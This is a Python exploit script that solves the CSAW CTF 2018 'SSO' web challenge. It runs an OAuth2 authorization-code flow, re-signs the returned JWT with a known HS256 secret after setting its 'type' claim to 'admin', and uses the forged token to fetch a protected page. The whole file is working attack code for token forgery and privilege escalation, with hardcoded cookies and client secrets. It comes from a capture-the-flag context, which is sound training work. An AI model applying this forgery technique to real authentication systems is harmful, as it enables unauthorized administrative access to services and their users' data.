import requests
import re, time
import base64
import jwt

# Author : Abdelmoughite EL JOAYDI

# get Oauth2 authorization code 
def sso_oauth2_authorize():
    
    _aurl = "http://web.chal.csaw.io:9000/oauth2/authorize"
    _cookies = {
    "__cfduid": "d1ee7ae250702f10489ab1eb535a63a001537014669",
    "CSAW-CTF-2018-QUALS-SSO": "eyJ0eXBlIjoidXNlciIsIl9leHBpcmUiOjE1MzcxNDg5MzA2NjgsIl9tYXhBZ2UiOjg2NDAwMDAwfQ=="
    }
    _header = {
		'Content-Type': 'application/x-www-form-urlencoded',
	}
    _data = {
        "response_type": "code",
        "client_id": "6779ef20e75817b79602",
        "client_secret":"6779ef20e75817b79602",
        "redirect_uri": "http://web.chal.csaw.io:9000/protected",
        "scope": "full",
        "state": "protected"
    }
    req = requests.post(_aurl, headers=_header, cookies=_cookies, data=_data, allow_redirects=False)
    result = re.findall('Redirecting to(.*)">', req.text)[0]
    result = re.findall('code=(.*)&amp;', result)[0]
    return result

# Oauth2 exchange code for access_token
def sso_oauth2_token(code):
    
    _turl = "http://web.chal.csaw.io:9000/oauth2/token"
    _header = {
		'Content-Type': 'application/json',
		'Origin': 'http://web.chal.csaw.io:9000',
	}
    
    _data = {
        "grant_type":"authorization_code", 
        "code": code,
        "redirect_uri":"http://web.chal.csaw.io:9000/protected",
        "client_id":"6779ef20e75817b79602",
        "client_secret":"6779ef20e75817b79602"
    }

    res = requests.post(_turl, headers=_header, json=_data, allow_redirects=False)
    return res.json()['token']

# Cracking JWT and altering it with new data
def JWTForgery(token):
    secret = "ufoundme!"
    # {u'iat': 1537196355, u'secret': u'ufoundme!', u'type': u'user', u'exp': 1537196955}
    try:
		initial_token = jwt.decode(token, secret, algorithms=['HS256'])
    except:
		print('signature error ! ')
		initial_token = {"type":"user","secret":"ufoundme!","iat":int(time.time()),"exp":int(time.time())}
    forged_token = initial_token
    forged_token['type'] = 'admin'
    new_token = jwt.encode(forged_token, secret, algorithm='HS256')
    return new_token

# get protected page with valid authorization header
def getProtected(jwt):
    protected_url = "http://web.chal.csaw.io:9000/protected"
    cookies = {"__cfduid": "d1ee7ae250702f10489ab1eb535a63a001537014669"}
    authorization_header = {
        "Authorization": "Bearer " + jwt    
    }
    FLAG = requests.get(protected_url, headers=authorization_header, cookies=cookies)
    return FLAG.text

if __name__ == '__main__':
    print "================================================== SSO Solver =================================================="
    print ">> Sending oauth2/authorize request ...."
    code = sso_oauth2_authorize()
    print "> authorization code :", code
    print ">> Sending oauth2/token request ...."
    token = sso_oauth2_token(code)
    print "> access token :", token
    final_token = JWTForgery(token)
    print ">> Final forged token : ", final_token
    print ">> Sending request to /protected ...."
    FLAG = getProtected(final_token)
    print "> FLAG : ", FLAG